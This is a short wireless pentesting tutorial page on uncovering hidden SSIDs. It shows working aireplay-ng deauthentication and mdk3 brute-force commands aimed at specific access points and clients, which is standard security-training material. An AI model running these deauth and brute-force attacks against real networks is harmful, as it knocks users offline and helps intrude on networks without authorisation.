---
description: >-
  Hidden SSID appear less visible, but this offers only minimal security, as
  hidden SSIDs can still be discovered.
---

# Hidden SSIDs

{% code title="Set interface to Monitor" %}
```shellscript
shsudo airmon-ng start wlan0
```
{% endcode %}

[Airodump-ng](tools/airodump-ng.md) will show hidden SSIDs; `<length: x>` indicates the SSID length.

To reveal hidden SSIDs:

* If clients are connected, use [**aireplay-ng**](tools/aireplay-ng.md) to deauth them. When they reconnect, **airodump-ng** captures (will show) the SSID.
* WPA3 networks resist deauth attacks due to 802.11w (PMF); brute-force attacks may be needed instead.

#### **Detecting Hidden SSID using Deauth**

```shellscript
sudo aireplay-ng -0 10 -a F5:D2:00:AF:69:67 -c D5:00:B2:AF:23:24 wlan0mon
```

#### **Bruteforcing Hidden SSID**

```shellscript
sudo mdk3 wlan0mon p -b u -c 1 -t A2:FF:31:2C:B1:C4
```

#### **Bruteforcing using a Wordlist**

```shellscript
sudo mdk3 wlan0mon p -f passwords.txt -t A2:FF:31:2C:B1:C4
```
